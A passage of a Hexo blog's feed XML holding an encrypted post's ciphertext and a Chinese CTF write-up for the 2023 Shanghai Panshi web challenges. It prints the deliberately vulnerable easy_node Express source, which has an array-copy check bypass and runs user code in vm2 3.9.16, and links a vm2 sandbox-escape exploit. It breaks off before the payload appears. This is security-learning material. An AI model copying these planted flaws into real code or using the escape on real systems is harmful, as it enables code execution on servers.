a29f3f42e3c570736b292142be54517431d379ca8513b75e59bfbcde5d58e284db2d627c1fc35a8c56b000c17923cfe114c0ecb46491a0c7dd963f2842d70fa89d62e1aa6d5c2242579098d592d05daee0d674fdc5e2c24cb51052adccb21f3e3ae833054c53845c8679b69b43b18da72e8a7acbfd0cbd3fb5710f92c3ba1e3b1c2d1c8d7e8af9bd185f52016e0a71162ab1c3cab81c8b1e7b3e1fd31030ab6e754ae7f9a063fb9138b9d1cbceb89689832ce98295ae793b15b4a0feb5944219dd8c40f29421847d35ed4d0a449395207396e6d7eeff2c88467f66c657a93d4e4a8acc77ec3e49d6d14260ab09668194484097962f636076a4564ab2c389260d57702107d6d713a542246b3ae3c7a01dfbc480bbffe0d8cffb677cbb3bc56d04a9f199bad1e823657b9a52bbc78baa6aa1152b67f8dbcb7990f2c504868664b3949d388e9bc96baa1b44dd0e2ca65767ca714890133feaf21f8b4a914490d2f124cc67aee35f0c547e5d57838cf719ad117355cea58e5fbebe95987bc1a3623d1f417114d9c6a69a27b3c679a940bf1a463e3a299b2048d523c7310525833e82a4f3e84d768745ed661e857cc1721bf035f80e8e8c46c42eefa528d85fc877633eacf0b190300e975f9031acdc2db17866979aaf217eac97131fc91a9d2f5cff168510bb3ef6933668375495a94f80f005e3edb63d313956d3e92bd7cfa10e405e953205684eced0472d76b9ad41c7b0ab7d7e7ad39c3d5f49e5115e9a4117e8a0dad77746914b5b24f3e7d6c09dc90a1eccd5a8fc3afad77bb1c813d2c39f1db6be85138181aff05d61777edf65226b73629b390c3db98a18d2a4861707f77e20d7cb5b93eb3ffacd939756a1c562e3ad2038336de27d19c3e3de1530ab247293f9b0b3186a7826184850c107527cd7834162a9402420f47b708283c125517aa61d7ed50f48974e00741dd8fb58547dbc146d0c0edb2ac7750dfca819dc999daf8ed41cd065f1b0268772554089e294d5c70521763a51ad1525d988ed930ec1f3bbec41570f28675f9c89bd84792c7e87c635a3339f761726516d2e50b41a27a2280ed5a37089e54ca3b6637ec2df948c25d722e0e0aa8264cbb8b1ac0f132404de68cf1e35d531b1e5cf0caee13f9659559d81938b3d0549ff4de5f55eca2760acb0961fedcbaae0f408f1f43989d12f1b3d2c266ba17aea8d2345fdc8b42ebaccc76c8bc389b3ec1b7a3250e024831562d1ef72b260a0d20ab52642b5c47a026388b64636d00f907491004dbc68c71d8d1656205f317bca54b7032d2bc0295f65bc5934c771ba846e4daa30e0eb98e6b2e48c7b09bb558ff7f6a1ac033e0adf0a059ec10607916a515b648ba2f1100bced19a57e3bb399669ff7b50cb620e7a13c179767879e5bb2f8d513dd5b3153d0b9aef95b335a7208c1ae4aa3d07f0da2ddaff5a7c9f86e7eb29053a0246e5b295c93569033c3fec5935084bba06cc7c8d117e3a316392ed92500120b73d8c68d75e4f3b6d0629c6e0d2589d6fa8e8ebaedb6a544f6ade9fbcb5cda6e5d2e7c0244f75655ab18b27eefc5b4da433b423b6f6029c41fd21facb338308c6c235e7b1a645a56bee79baa9a563f1bb050c55fc5dd52e6fea621172f4b8ec71b29db0dfadfea6f2678d401415a27906bfe685d8dbad7ef26b6421086baaff33aeac77dce310e5f61629e8b5010978290b45c0604ec33b4807accc91d6ad729a73d7601cbe49f9b13b47d286f210c4082d009aa25924a872c7c34125f268a8308027545c57e87fe78075a0e5db3f8ea671a27a71c580be01a7327e91de0d5f7e84f4d7e1509d505d3b5a4b17ff055c67735f5b3f93636d40e6d516f556d1e248c78157c99b5f3f696e2522a8d5bd5b5c1bb7dce2d7af68a7552d9dd353eb0aa516d68dd1433bc8dc3f6e7e4e749a4971ad66b2e84f4a615b918ce84f7b876ca7f7404ca9c36f180084b02738600bb59e0b4b24f8e69545af039e456b1368c33cf789f98c90352298ebc3d66bde1ae2134954e662b53c8f767131362d92879bb91b5ba116f361a9184c43ef0a71b6af7b7a57bf1418f09c8453052c86cad3a2ee7dbacc24c89dba9fad6b241826500d037af057b0ca6bdcc794e5452ba165a506605e436dbe3d3aa88cd3015e20b618cb4ba056133b124bc9d4c28d8f65e78f6ba4713da0050b61f38cfc817fba58debe3aa5ae7400f9d96bc111bf21647958215f57966ed16663928b4b3f920c9f5c81def2e8c282d89dd2a50873fecf71d415a40a1b0a92b25e5d7a54082e48b0e0f25b288bfa07f7fc9e138723a843c8121685afc9af9e9222619a37cf05cf25c95dd12b18ef0d602c7943da3d5a9256c65bc4f9a9426c910d4a3c94ffa79e1ff8879b4c50244da5054394731da59b73c0b0cfaa0206f1888ddfbeea59862c80d365066ec129253cbc4fa79f4a77209bad880a65c161256053f27b8850a7eef152a6481ecc5c3926dbebb2e0b423b12e978a98f046cef82869557b55e6db2c267d13f12cb95f2694e84e218452d8d6b6722e20712372134f9ea329e743d915dd930b880ddf5df719fc4d875efbb53b87511947cd2e4e8c87928351d9ab0c49bf66f61c336f3e077dfe7017facbf5d0f7e49b5291aabfd564a38dfe9bf6d960a1b6d43b8c611a744ac32fde520b88fe3cb6570d4954287947b6f0a329e9cb2cd661e53c46149258f54725d63ac51bb35744650b45df4cffc165eef5f14b634c2f7e9b15d67be739aefa019017f5ca4fae345166048ede863fdc03615da29e2aff229167a95ef154b21d9930fe1505638bd263a852d7820de3e16ce4f18acfc07fe5cc889298130ca18f34f026be8a0297438cbe40d0c35a67258203505fcf7a54ae13efdddc28891f0f3bdb5b900aa2aa12831b785ca398075c3e52f9b0cdf95dc9725dab15624d51fe48377fbabc0b7e04444573240ca53d2cd874fe419b4e4fffc3618c7c936f460d9e290dfad1a47376f86519556cde8279f7e587f79d4f4d4374b4149920be4330075d84b5903deb38890dfe70e2a5f962f34a47383abdd0b306e2c5cb6274d76a1c73ce723bdd9e70beb46be1fd9952188c138783637bcbd4e323331d523411e635ffd1629d59bad8e34e65c0557fddce62ac57e6cbe7dc15c336c1fe1b6e5d4dd45a23791d87dd930d74c5e7bb54049ccc9efd39401cc707fe069da6cfabd08881ffd6a2255373d17824bbb15b6a957c98007b0a6b29c81dd565ffb4c6652b22c734517390ff31884f320816c12b1fd6fe8abe17eb488faf3dc6351601f71690a73136bcdaf3c34a0530726df25e4b3c40682d103aaaf44a38f826fc928a1fd3da3d409fba8f7d76c93f5b8fde2ed90d80b2c279e5245efb6dcb6207cd2288cd3b67552451efefc79e8dbd28673c32058520fbf98606191c4089f3d3307cf9c389a05fe47dac09f72f48854d151da4f0ec895ee5ec4ecb855f45c04c135dcbbe34e59a4bb9675ef2ebbeba629b8284280686e9cf5daa490db532caf102835f13e5042a25495dcec70ec13da1b5e1758b99f0e66482f97350d894ac8893cfe7c96d9e19659e70e4a9c667750be4aa48afd263072e03e7a4f842a54982470b5c13cbd3d34011976b4e6da66efe816d79325edc32a1e51361bb7fe9852ff23b9012d1a09225e1d11f31ccbeaab5ce6b4a663bfe94636701be105a34039b86c05da6e559d380bcdce00458558ecc3d2f2bd23f757eeff6f30c309d5c8f6b4090bdf85fcd1c618775b574b895a996e27fb33312653704abc4ea78432357bb80355ad83e626a2a96b00e0f17a58d882106eea3cdf3c31767f8c66eb9544e395a53f57fe5581c4656f7c45ff095120df3ca11d981b2a5c59e151db4447cec06be7464cb6041252fe34e0843adda4eb650ecd6f1fc222e518fb8fa0d91f60391737804a1afc1d849de953a3eaf4b0b345c139b3da42b3d9275b02b0649d2d1a522f155186c003232e56041b7d3d1cdf594fc114847d4a16cb69a5cfa1cc0b1aecbc2b96890b0e861b6ae3252cd0875dd30bfc30f45878a333f5453747f748d0a85f8e65163e7ad80b3c5f002347a5c977e3766566362a370c1ff29f2541d519120a69098968c6fadfad770ea680ad1d15cb0d236ca5f339f2db2a90ed54ed4223330aec20db3c8d5de254181afaecac3c9d6bde00d953b271d0ce4407486271907c064d81a1742ec3dc8c265f17ed0814539993e8851e75c15f364880f5ef9ffb574ebf5d99dc94f78f9f403356ef7f3537561d7db79eef3091c6d72393ebefbf653f5a90ec7fc5a10f125c68bfbe23e620caa643396e709722afb64401124f0379c2f4c6bc1d4d6c3216e49d418ad8e5c0b79c38aaabe494cafa76489ac7536aa445918ab5a8372ba8b54e3713adcefe77c3243a5b78af0c685f598a8e8e0c967ab1d90ca3685714a4356ee49a27c398315eb2b882a79479be7e39a9d9cbb1c1044179ac3219be3062373c0d93059df090e9fa45ed57199724a51b5ce01ae3ba5ee8de54088be129e11cecf57162e331774f87d0df68e70af0d5eb059244d0b7b9a7b2a1dcea07fdfd09ffb6f37049714a00e6a199e8069202b7bd7993caeefdc73429c48a687965692182bdd436e5eeddde5fdd4b3c34540822d805242fda62c6ac7af08d267b7fdde51dcfb3a937872ed7f213181593e3b9fbee3c7295ad187beeedac2c505eabb21767bc98044150a85faa2ff239d1b13a5b6aacccc22b664c7b020e50b75f714f98125a491420e0a88e40826aae69cbd8354d1f249ff9dc8afab3e688cca6613e0a7d5faf0416257b8057701bf6b49d31032c3b80430a427e3d99b363fd3cb938d22ee159be11c2974ec0df7a50a98df14ca8112c7d2af489ebd2a71cfa708d453044f018b97401d8ebc7cf08a4a4841b98f0625b9bf74c69b54dda3781221cd3d98f7f6da6c38c185afcc77ed27d829d09f27eb4e876ba220cc9f1e4115b7a2994239ed3c6451b3309e7990216c6643968c8c7710978db547365fc620a04f7ed2f4bdeae8c5cfcdb9683d9f54d0f0cdcea54a94f459e1f7ae0cd14603aaab9a11d36b834f145f9c5b2b18b9d11eee8f28c474b0f399b104cfc9dff11abe3c179c839dcdba97e2360070562f8a2b38314bf8d4b45bbb0b38ab7904c398e65c0cf0695f9765db9da2ea9fdbfc6cd6b852ddb103914acfbb54c0b5cd303697cd6bcc8d8fa76a656f83085332595ec6dc0787b1e22e6aab2e8ea2ab886c60e35ebd82fedcf9693e1c341f1f257296866367728f09467ff25bdb41ce62b2dad5776eac9f8733b96a94a60b0b9b5fdd88f36dd6b50585d3a763276664f8d47a8f6d7aabf50be62ab999e39fa2feee51e7b2998db9ac23f1a3514998370dadfbad761080af457e4cdf0324af353eccf272d403b1e107dabfa20f1e914448605e48ee40bc5ace911eddddda2ec83eaeb2f58c84327b468826993c7b63d0d684e90ce8da69479f9c390cad58577c14f95b8076ef764f07f6f5acfdad35abb5c6731e352e9139b5e9ddd4fafef6725b2cf7359720551cda8db20de380bd1ce372ac9a1786a7fe68f670ea77b79d3f4993a28fdb9bb85ab3fd991e9fba225c33ef4cf7da3f523787c8e6a78d34715ae78a625ef455824cca3256870c16458d542b8c07e7a77b24c74af65eaf76bff0d2a38093b1df5fe71bf867fc8bbd2b784984e12440af7fdaa80a1dfca75b02dfd98f4a49a4f4a985902e97118cfa128f393fd6043a5bc893bc5e6eb4ce1b0475bf2261f63ae7f79d3a420b181796066f09bb623b38e752a20c5d3eae059e1cc4c6c25c041aa16469c6958b3e811daa6fbfa13996f4536823f2d65f770d43fa90c12207f00692ce3cb6f82a4311d662bdba1e4889f5e561385658a6c572ab0666f91436e3102671e6a109fd1bb7b142ed49e734845ffa354b07bbdcc39728f1b2c4434b0a23278838f508ae7ef3769f05f924140b6234dd8456a138e9531cee803137d786ab65c49ee8fefdfc51ea583e6f97e8e39d1192fa29a0cd22a2101af81b95ef558675c13da5174d6abdcc823b2b8a3112fa78da9f20307205af53fe27daa41979bdbbabcdd6438cba74b4b24897cbf16e4ebf3de4caee075015194eea9dcd71ad995c7c7f0a06744a4485ab82b97c1d5627f4b356ed969a5e127b03083b9fb01c7692b6ed69e9a7d0741baae744bbf84af797d7b8a8b0c03740a3df7a186221305992ea313113a9e40f8f63128ca3ab39377ef989d6984f4ae383e2733b4ca291089619616bc58ee5cf33546294de61fca779ffd9f8ea2f49bf132bf5c7d91898045690b5797ab9b77ae1114bb177d3ec1a1f6f4abb2a66aa2fe2b80e063409cbe9484438f4e204c89baab5e4b1a24517062afdc6b9e084d52a39ecdeb8e5727b7a2c9cb481930b80c9469aa077c3e39682df0a795cf10a49f6dcc2f41e59cf001c58a3deab43b72343bdde25389f07f8834a2723e7cd89eb1b49b10fc53d932ec5f234019f7d6dbda848a75a971866949daec19b224f6eb674e93329ba185715b0c1c79fd3d1435530b3a7a5517e11dda1201798f2a188ec26b1ad95784f0ad62c650166c24d01afccfedd0c6c29ff6cd945dcbeac47c951037c678c1cb3fd9ee1208aeed718422571aadec4a9fe13148410d856271cf581e7f475f816703ee8d185ce329e2f27bf0926fcbdd0d721e89bc7fee109cdb348c8f9e22dafe9ff872004b9e98934b00f2b6948f7d8cd1bd8020e086f87bd5f655790b72e7d273fb65d5f37711c816b7328f45548a6a6a9d0a08e6ad1560a85d0a706a4e59faf67063e2cb5f9f5b43181f820582b7c879661486986250f048906cc9705d74355a26e94154cefdde5cbbadbb0ea96e717c7dd1f329c154e5342a8d6e482bd67fa383fea93ff6e8c46f603cc611806768a88d9b7cabff46535ffcdc69561cb31f725bbb788fcec0ea1bb0e7782388a636d140116bfd609a31717f67257048b7e7488cb27781ff7eb5202ea7e4900fb2ebcc4ec20852a5eb96727d705e5181fcd94cffa0573b8996346e7420545ffe0319f655b82c21b8c880d7ef625a6b79c3da1a48adc619cc263f3c507b735bc291c18eff3efdbda9257ed7f935c1641a4ddfbbac246557a809b136c6f021f27da9c16db52640aa76670f35b9d3dd56a0613a8eab2c5fb525f56789f013e8f3bb5b52e431f71431ec14cb60a303bb32ec58761a50bebe44b47e0e7125f957517860c283ef9dea0c7ca13fe98bc6ae724cc9f526736223d9d8bcf47105e84fd248d26282e39150767f8480d471841cc80341f86b19877d0fe17c9c9bbde80d37e8ea7670bf86db49e3e82a17ed7ee580cd4164e02f4bee0a055d67c7719137f0378490cee2544eb8e66a0ac7ccacf0e1189359618a1719befa05028760fe4b259922ea5d20f8c80a1a6a60cf6c06a04ca9d3d0b7c3eb5e5797df3adaefd63c1a507a11bee1a49354bf22e9762c40d45b4ce931bf442af8b009e49741758fda278888c6e647aa4d116f11e1c1105051f36cc25b63c0ef8fa812d39416daa0fac5083195f87c89b81089b4376864bc42aab3c963a558d3e8952a2add49031ad7cd8ed79850aa8abded2be1dc87429c60b31c006f2f210595c3e396ea420bba40b3da9ff978536a0dd8554a1bfe8a8a5e2afdbbb9cd923ed03b6ce1c92ea9022445259accd2eb85f88c4c1bfe0838952527d3808c4e6c849f4ee9895b7f2db17dc35283cf8c2b5dd98df0764a0e9737b0d3442f094934f8af08447a56936f6b6bbb42e479ea2960494850771a2123cc457f445eb10b318e00d1911c846de9cb571ad0bd3fcc8bed429065a2a178ed0f8d000c588735b6bfc061acad5fc0e2493a530165d08b2a6258545caf9ed663674611b95a7e665bf94ff2e9147dadc7b165750360ded27dbccfa5df5503a35966ed9eeaf6eb5b558fbe74bafc7269b39bb4513701a4fc59195cb9f9dc8ddebcc8c08f37a7986df3aede96e91bbe1118782f1c92c8ca9b7b500f5d018ba61764300220b6e2ae62580081e49a07e4d2c705f405ad970da6a196604fcd2815b8b756a18768c56a1511d6fff4007338523a175f1708cb070879612759e0036c1a3b3e4b1b21b95589cc9c24824fbdbddf451b8488ecbf4c5211f96527a9239ede57b8608b251a4a16526ac763de0749b9add69a0b10144f1911aae6655c5c622e0f07789d8ca9e0c5066852dbe5c54b856060ca8833e6827f04e9f8ae21ea433e41082061363b44769f6bb9f2d96a54ebccd1cc620f0f2a433225bc242869b2b2321b8f5e32ae4ff4c7138b1e044c4e416a6f56b8f3b47f5af6d3d236409483b2d0abbac36a6997541c84858ad9fe6397e604ba2c047ffdc2db2779de3ec6fe36674f5c724cccc46ab36cf72af6614848b6a7a95cbfa5bc0f6299a3c9ed11111daea76e6f40ed42eef758aa438c92d4bfa32fcf198121c041b0c559f370fc25fb883882474385e2ffc633859a232bab0daf8fe2939db29c0a0e08a03803ef21bce00df06f0c955a919eae580c6cabfa9cd100c5cd535fce2acf6d749cb878d96f800d4b4d0f81c1dba590bd37d2d3f8abcfb6eb8b3096bf0e151de847ca7dd39dc8a89b51f391c6a46b5615c2bcca3a32bada9057f7b251eecc74c8856ffc45070e6ba0c5866cd6d667fbbdf79409974b2b2832d3916a5198ac579113f8c9d80d2a43d85133d791236ceca0606c731af561780f5f36f0d2f89924bfd624a24b63d40d5d40ef82688158f58cb707affe583f8f9c5e976a629dd8ed2be33bab016b0e424634440b86edcd25eda0476014bf166e86e148aca66f2010b1c3c62b8cee2d4c4130d0f1b5f2badc7f68e731b897a467186730f3321ef2cd1eb82290b55be8d8c145633bf849ef74024ef57350e726c96f9c6bfced63769fedf5fc86a11027f70e30b873bf299fe829e382cc251da600259ab14a89d6cb783ab136fdb4e7701a4f4053660805a1326c8be7d8d700b31f05e170067ecac1eb134dc03d4c8741eca3a59055557d5e164e63c14746d1b7219f1598ca091c490e9cfb8746e04e6234808fb4dfb165723c543a7b3e849a7b0dcf8b4b39249d6fe3ed6b1597dd6d8ab4a231d994fabebe0b88553a146d02887d25a50c274efcd4ffd8b81da634602b84b8548b3d0b4889f4d9f255644686bc840cc42ac6d606b4c31452f0258103781ef75c84a6325de5c351ac18e4b88640c7b8bee457e3e43d345c27a28daf5181d463a3e47e0aeb82190536c6986e7b6e37af66b3306e38cc4c65a4564b377874b8ffdbe00f8116c752f8dd28de8c339ae8295ac211e96ff9266750162246529086fdc7eba4c4268ae752273a4e336dc46c10f5bcb8feefa8e7b6862f717846bee6d60da3e86b29518978c25ef7f7b6f5bdeb07c660ef75249640063c11d940c0250845d99742e5eeed11b6d4a876bc573cef66a050788fb6ec2aef7f11afab9c435e66c77</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-文件包含" scheme="https://ke1nys.github.io/tags/show-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>上海磐石行动-web-2023</title>
    <link href="https://ke1nys.github.io/posts/d4cd86c8.html"/>
    <id>https://ke1nys.github.io/posts/d4cd86c8.html</id>
    <published>2023-05-23T12:17:07.000Z</published>
    <updated>2023-05-24T02:23:30.374Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://fushuling.com/index.php/2023/05/21/%e7%ac%ac%e5%85%ab%e5%b1%8a%e4%b8%8a%e6%b5%b7%e5%b8%82%e5%a4%a7%e5%ad%a6%e7%94%9f%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8%e5%a4%a7%e8%b5%9b%e6%9a%a8%e7%a3%90%e7%9f%b3%e8%a1%8c%e5%8a%a820/">参考wp</a></p><h2 id="CookieBack"><a href="#CookieBack" class="headerlink" title="CookieBack"></a>CookieBack</h2><p>题目</p><p><img src="../images/image-20230523201738862.png" alt="image-20230523201738862"></p><p>这题太傻逼了，我以为得需要用这个搜索框来查出一些东西来解题，一直卡在这个思路上面</p><p><img src="../images/image-20230523201839121.png" alt="image-20230523201839121"></p><p>其实这里说的偷cookie，其实就是把自己的cookie传进去就行了…….</p><p><img src="../images/image-20230523202009372.png" alt="image-20230523202009372"></p><p>特别的离谱……….</p><h2 id="easy-node"><a href="#easy-node" class="headerlink" title="easy_node"></a>easy_node</h2><p>这是个nday的题目</p><p>访问/src就能拿到源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line">session_secret = <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">substr</span>(<span class="number">2</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>(session_secret));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123; <span class="attr">secret</span>: session_secret, <span class="attr">resave</span>: <span class="literal">true</span>, <span class="attr">saveUninitialized</span>: <span class="literal">true</span> &#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyArray</span>(<span class="params">arr1</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> arr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(arr1.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr1.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr1[i] <span class="keyword">instanceof</span> <span class="title class_">Object</span>)&#123;</span><br><span class="line">            arr2[i] = <span class="title function_">copyArray</span>(arr1[i])</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            arr2[i] = arr1[i]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;see `/src`&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vm2_tester&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">name</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = &#123;<span class="string">&quot;username&quot;</span>: req.<span class="property">body</span>.<span class="property">name</span>&#125;</span><br><span class="line">        <span class="keyword">const</span> properties = req.<span class="property">body</span>.<span class="property">properties</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; properties.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (properties[i] == <span class="string">&#x27;vm2_tester&#x27;</span>) &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;cant set vm2_tester by self&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span> = <span class="title function_">copyArray</span>(properties)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Success&#x27;</span>)</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;input username&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vm2&#x27;</span>,<span class="keyword">function</span>  (<span class="params">req, res</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>.<span class="property">length</span>; i++)</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>[i] == <span class="string">&#x27;vm2_tester&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="regexp">/\b(?:function)\b/</span>.<span class="title function_">test</span>(req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">                        res.<span class="title function_">send</span>(<span class="string">&quot;define function not allowed&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="regexp">/\b(?:getPrototypeOf)\b/</span>.<span class="title function_">test</span>(req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">                        res.<span class="title function_">send</span>(<span class="string">&quot;define getPrototypeOf not allowed&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line">                    res.<span class="title function_">send</span>(vm.<span class="title function_">run</span>(req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>]))</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&quot;input code&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;not vm2 tester rights&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;see `/src`,use vm2 3.9.16&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/src&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;app.js&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230523202607587.png" alt="image-20230523202607587"></p><p>这里因为给了这个vm2的版本，于是就去google搜索，于是第一个就是</p><p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p><p>这里当时卡住的原因是因为</p><p><img src="../images/image-20230523203752773.png" alt="image-20230523203752773"></p><p>所以当时就很疑惑，不知道怎么绕过他</p><p>然后看到别人给的wp</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>: 